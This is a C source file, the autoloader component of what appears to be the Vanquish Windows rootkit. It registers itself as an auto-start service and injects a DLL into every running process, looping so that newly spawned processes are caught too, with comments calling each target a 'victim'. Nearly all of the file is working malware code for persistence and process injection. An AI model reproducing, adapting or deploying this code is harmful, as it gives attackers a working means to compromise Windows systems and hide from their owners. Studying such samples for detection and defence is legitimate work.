/******************************************************************************\

	Vanquish Autoloader - Copyright (c)2003-2005 XShadow, All rights reserved.

	This program is free software; you can redistribute it but not modify
	it under the terms of license.txt file that came with this package

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
	license for more details.

\******************************************************************************/

#include <windows.h>
#include <tlhelp32.h>
#include "..\Injector.h"
#include "..\Utils.h"

//constants for service handling
#define VANQUISH_SERVICE_Q "vanquish"
#define VANQUISH_SERVICE_NAME "Vanquish Autoloader v0.2.1"
#define WAITHINT 500

//service status
SERVICE_STATUS ssStatus;
SERVICE_STATUS_HANDLE sshStatusHandle;

//for injector
DECLARE_MODULE(KERNEL32);

//for exception handling
HMODULE hVanquishModule;

//prototypes
BOOL CALLBACK MyEnumWindowsProc(HWND hWnd, LPARAM lParam);
void VanquishInjectAll(DWORD dwUnload);
void WINAPI SrvAutoloaderHandler(DWORD fdwControl);
void WINAPI SrvAutoloaderMain(DWORD dwArgc, LPTSTR *lpszArgv);
BOOL ReportSCM(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint);
void CmdInstallService();
void CmdRemoveService();
VOID WINAPI __VanquishEntryPoint();
int WINAPI __WinMain(HINSTANCE hImage, LPWSTR lpCmd);

//implementation
BOOL CALLBACK MyEnumWindowsProc(HWND hWnd, LPARAM lParam)
{
	PROCESS_INFORMATION pi;

	GetWindowThreadProcessId(hWnd, &(pi.dwProcessId));
	pi.dwThreadId = 0;
	pi.hProcess = NULL;
	pi.hThread = NULL;
	Vanquish_SafeInjectProcess(&pi, VANQUISHINJECT_PRESUSPENDTHREAD | VANQUISHINJECT_POSTRESUMETHREAD);

	return TRUE; //continue enumerating
}

void VanquishInjectAll(DWORD dwUnload)
{
	HANDLE hSnap = NULL;
	LPPROCESSENTRY32 lpPE = NULL, lpPE_OLD = NULL;
	const DWORD dwPEcnt_MAX = 2048; //maximum number of processes so we won't clog up memory (just in case)
	DWORD dwPE = 0, dwPE_OLD = 0, dwPEcnt = 64; //64 processes should be enough (automatic resized array anyways, check code...)
	BOOL bSuccess = FALSE, bSame, bFound;
	LPVOID lpTemp;
	DWORD i, j, dwOurPID, dwPID;
	PROCESS_INFORMATION pi;

	//it will fail otherwise...
	LOAD_MODULE(KERNEL32);

	//prepare the injector
	if (!Vanquish_PrepareInjector())
		return; //we will crash windows if injector fails; so we quit

	//allocate memory
	lpPE = (LPPROCESSENTRY32)VRTAlloc(dwPEcnt * sizeof(PROCESSENTRY32));
	lpPE_OLD = (LPPROCESSENTRY32)VRTAlloc(dwPEcnt * sizeof(PROCESSENTRY32));

	//at this point we use goto cleanup to free memory
	if (!lpPE) goto cleanup;

	//get our pid so we don't inject ourselves ;)
	dwOurPID = GetCurrentProcessId();

	for (;;)
	{
		hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if ((DWORD)hSnap == MAXDWORD) //so says the documentation (-1 is failed)
			goto defmethod; //default method

		//get all PE data
		lpPE[dwPE].dwSize = sizeof(PROCESSENTRY32);
		if (!Process32First(hSnap, &lpPE[dwPE])) goto cleanup;
		for (;;)
		{
			dwPE++;
			if (dwPE >= dwPEcnt)
			{
				dwPEcnt = dwPEcnt << 1; //double memory
				if (dwPEcnt > dwPEcnt_MAX) goto cleanup; //make sure we don't use too much memory

				//realloc current
				lpTemp = VRTReAlloc(lpPE, dwPEcnt * sizeof(PROCESSENTRY32));
				if (!lpTemp) goto cleanup;
				lpPE = (LPPROCESSENTRY32)lpTemp;

				//realloc old
				lpTemp = VRTReAlloc(lpPE_OLD, dwPEcnt * sizeof(PROCESSENTRY32));
				if (!lpTemp) goto cleanup;
				lpPE_OLD = (LPPROCESSENTRY32)lpTemp;
			}
			lpPE[dwPE].dwSize = sizeof(PROCESSENTRY32);
			if (!Process32Next(hSnap, &lpPE[dwPE])) break;
		}

		if (hSnap) CloseHandle(hSnap);

		//cycle through processes
		for (i = 0; i < dwPE; i++)
		{
			dwPID = lpPE[i].th32ProcessID;

			//sanity check (do not enum ourselves or we'll hang)
			if (dwPID == dwOurPID) continue;

			//inject vanquish
			pi.dwProcessId = dwPID;
			pi.dwThreadId = 0;
			pi.hProcess = NULL;
			pi.hThread = NULL;

			//if it is the case then unload, else do loading
			if (dwUnload == 1)
				Vanquish_SafeInjectProcess(&pi, VANQUISHINJECT_PRESUSPENDTHREAD | VANQUISHINJECT_POSTRESUMETHREAD | VANQUISHINJECT_UNLOADVANQUISH);
			else
				Vanquish_SafeInjectProcess(&pi, VANQUISHINJECT_PRESUSPENDTHREAD | VANQUISHINJECT_POSTRESUMETHREAD);
		}

		//PS: we cycle again through them to see if any new process has risen while we were injecting
		bSame = TRUE;
		for (i = 0; i < dwPE; i++)
		{
			bFound = FALSE;
			dwPID = lpPE[i].th32ProcessID;

			for (j = 0; j < dwPE_OLD; j++)
			{
				if (lpPE_OLD[j].th32ProcessID == dwPID)
				{
					bFound = TRUE;
					break;
				}
			}
			if (bFound == FALSE)
			{
				bSame = FALSE;

				dwPE_OLD++;
				if (dwPE_OLD >= dwPEcnt)
				{
					dwPEcnt = dwPEcnt << 1; //double memory
					if (dwPEcnt > dwPEcnt_MAX) goto cleanup; //make sure we don't use too much memory

					//realloc current
					lpTemp = VRTReAlloc(lpPE, dwPEcnt * sizeof(PROCESSENTRY32));
					if (!lpTemp) goto cleanup;
					lpPE = (LPPROCESSENTRY32)lpTemp;

					//realloc old
					lpTemp = VRTReAlloc(lpPE_OLD, dwPEcnt * sizeof(PROCESSENTRY32));
					if (!lpTemp) goto cleanup;
					lpPE_OLD = (LPPROCESSENTRY32)lpTemp;
				}

				//remember our victim
				lpPE_OLD[dwPE_OLD - 1] = lpPE[i];

				//we found some new shit so we inject it right away!
				dwPID = lpPE[i].th32ProcessID;

				//sanity check (do not enum ourselves or we'll hang)
				if (dwPID == dwOurPID) continue;

				//inject vanquish
				pi.dwProcessId = dwPID;
				pi.dwThreadId = 0;
				pi.hProcess = NULL;
				pi.hThread = NULL;

				//if it is the case then unload, else do loading
				if (dwUnload == 1)
					Vanquish_SafeInjectProcess(&pi, VANQUISHINJECT_PRESUSPENDTHREAD | VANQUISHINJECT_POSTRESUMETHREAD | VANQUISHINJECT_UNLOADVANQUISH);
				else
					Vanquish_SafeInjectProcess(&pi, VANQUISHINJECT_PRESUSPENDTHREAD | VANQUISHINJECT_POSTRESUMETHREAD);
			}
		}

		if (bSame) break; //we have them all :)

		//dwPE_OLD <- new pids from dwPE; clear dwPE (conserve memory)
		dwPE = 0;
	}
	bSuccess = TRUE;

cleanup:
	if (hSnap) CloseHandle(hSnap);
	if (lpPE) VRTFree(lpPE);
	if (bSuccess) return; //otherwise we try defmethod
defmethod:
	//no way to enumerate all processes!
	//at least enumerate and update ALL windows!
	VRTWriteLog(FALSE, 0, NULL, "WARNING! Toolhelp32 not available! Default window-listing method used. Background services may not get injected.\r\n");
	EnumWindows((WNDENUMPROC)MyEnumWindowsProc, 0);
}

void WINAPI SrvAutoloaderHandler(DWORD fdwControl)
{
	//thread usage: same as WinMain

	switch (fdwControl)
	{
	case SERVICE_CONTROL_STOP:
		//we are stopping NOW!
		ReportSCM(SERVICE_STOP_PENDING, NO_ERROR, 0);
		return;
	default:
		break;
	}
	ReportSCM(ssStatus.dwCurrentState, NO_ERROR, 0);
}

void WINAPI SrvAutoloaderMain(DWORD dwArgc, LPTSTR *lpszArgv)
{
	//thread usage: NEW CREATED

	//registering service handler
	sshStatusHandle = RegisterServiceCtrlHandler(VANQUISH_SERVICE_NAME, (LPHANDLER_FUNCTION)SrvAutoloaderHandler);
	if (!sshStatusHandle) return;

	ssStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS;

	ReportSCM(SERVICE_START_PENDING, NO_ERROR, WAITHINT);
	//VanquishInjectAll(); already did this
	Sleep(WAITHINT);
	ReportSCM(SERVICE_STOPPED, NO_ERROR, 0);
}

BOOL ReportSCM(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint)
{
    static DWORD dwCheckPoint = 1;
    BOOL fResult = TRUE;

    if (dwCurrentState == SERVICE_START_PENDING)
        ssStatus.dwControlsAccepted = 0;
    else
        ssStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;

	//update things
    ssStatus.dwCurrentState = dwCurrentState;
    ssStatus.dwWin32ExitCode = dwWin32ExitCode;
    ssStatus.dwWaitHint = dwWaitHint;

	//reset and update checkpoint
    if ((dwCurrentState == SERVICE_RUNNING) || (dwCurrentState == SERVICE_STOPPED)) dwCheckPoint = 0;
    else dwCheckPoint++;
	ssStatus.dwCheckPoint = dwCheckPoint;

	//finally update our status to SCM
    if (!(fResult = SetServiceStatus(sshStatusHandle, &ssStatus)))
	{
		VRTWriteLog(TRUE, GetLastError(), NULL, "SetServiceStatus() failed.\r\n");
		return FALSE;
    }
    return fResult;
}

void CmdInstallService()
{
    SC_HANDLE schService;
    SC_HANDLE schSCManager;

    char szPath[512];

	//find out our complete path
    if (GetModuleFileName(NULL, szPath + 1, 512) == 0)
    {
        VRTWriteLog(TRUE, GetLastError(), NULL, "Unable to install service.\r\n");
        return;
    }

	//stringize it
	szPath[0] = '\"';
	szPath[STR_NUMCHA(szPath) + 1] = 0;
	szPath[STR_NUMCHA(szPath)] = '\"';

	//open SCM
    schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (schSCManager)
    {
		//new service
        schService = CreateService(
            schSCManager,
            VANQUISH_SERVICE_Q,
            VANQUISH_SERVICE_NAME,
            SERVICE_ALL_ACCESS,
            SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS,
            SERVICE_AUTO_START,
            SERVICE_ERROR_NORMAL,
            szPath,
            NULL,
            NULL,
            NULL,
            NULL,
            NULL);

        if (schService)
			VRTWriteLog(FALSE, 0, NULL, "Service installed successfully.\r\n");
        else
			VRTWriteLog(TRUE, GetLastError(), NULL, "Service install failed.\r\n");

        CloseServiceHandle(schSCManager);
    }
    else
        VRTWriteLog(TRUE, GetLastError(), NULL, "Cannot open SCM! Maybe not admin!?\r\n");
}

void CmdRemoveService()
{
    SC_HANDLE schService;
    SC_HANDLE schSCManager;

	//open SCM
    schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (schSCManager)
    {
		//open service
        schService = OpenService(schSCManager, VANQUISH_SERVICE_Q, SERVICE_ALL_ACCESS);

        if (schService)
        {
			//first stop it...
            if (ControlService(schService, SERVICE_CONTROL_STOP, &ssStatus))
            {
                Sleep(WAITHINT);

                while (QueryServiceStatus(schService, &ssStatus))
                {
                    if (ssStatus.dwCurrentState == SERVICE_STOP_PENDING)
                        Sleep(WAITHINT);
                    else
                        break;
                }
            }

			//then delete it
            if (DeleteService(schService))
                VRTWriteLog(FALSE, 0, NULL, "Service removed successfully.\r\n");
            else
                VRTWriteLog(TRUE, GetLastError(), NULL, "Service removal failed.\r\n");


            CloseServiceHandle(schService);
        }
        else
            VRTWriteLog(TRUE, GetLastError(), NULL, "Cannot open Vanquish Service! Maybe not installed!?\r\n");

        CloseServiceHandle(schSCManager);
    }
    else
        VRTWriteLog(TRUE, GetLastError(), NULL, "Cannot open SCM! Maybe not admin!?\r\n");
}

//this is in place fo the c/c++ CRT entrypoint
VOID WINAPI __VanquishEntryPoint()
{
	int winmain_ret;

	hVanquishModule = GetModuleHandleW(NULL); //for exception handler
	VRTInit(); //initialize run time library

	LPWSTR lpszCommandLine = GetCommandLineW();

    //skip past program name (first token in command line).
    if (*lpszCommandLine == (WCHAR)'"')  //check for and handle quoted program name
    {
		lpszCommandLine++;

        //scan, and skip over, subsequent characters until another
        //double-quote or a null is encountered
        while(*lpszCommandLine && (*lpszCommandLine != (WCHAR)'"'))
            lpszCommandLine++;

        //if we stopped on a double-quote (usual case), skip over it
        if (*lpszCommandLine == (WCHAR)'"')
            lpszCommandLine++;
    }
    else //first token wasn't a quote
    {
        while (*lpszCommandLine > (WCHAR)' ')
            lpszCommandLine++;
    }

    //skip past any white space preceeding the second token.
    while (*lpszCommandLine && (*lpszCommandLine <= (WCHAR)' '))
        lpszCommandLine++;

	winmain_ret = __WinMain(hVanquishModule, lpszCommandLine);

	//bye bye!
	VRTDeInit();
	ExitProcess(winmain_ret);
}

//the stripped WinMain thing...
int WINAPI __WinMain(HINSTANCE hImage, LPWSTR lpCmd)
{
	SERVICE_TABLE_ENTRY steVanquish[] =
	{
		{VANQUISH_SERVICE_Q, (LPSERVICE_MAIN_FUNCTION)SrvAutoloaderMain},
		{NULL, NULL}
	};

	//command line options processing
	if (lstrcmpiW(lpCmd, L"-install") == 0)
	{
		CmdInstallService();
		VanquishInjectAll(0); //inject dll into all programs
		Sleep(1000);
		return 0;
	}

	if (lstrcmpiW(lpCmd, L"-remove") == 0)
	{
		VanquishInjectAll(1); //remove vanquish from programs
		CmdRemoveService();
		Sleep(1000);
		return 0;
	}

	//we are ACTIVE!
	VanquishInjectAll(0); //inject dll into all programs
	Sleep(1000);

	//service starting... and stopping ;)
	if (!StartServiceCtrlDispatcher(steVanquish))
	{
		VRTWriteLog(TRUE, GetLastError(), NULL, "Service Control Dispatcher failed.\r\n");
		return 1;
	}

	return 0;
}
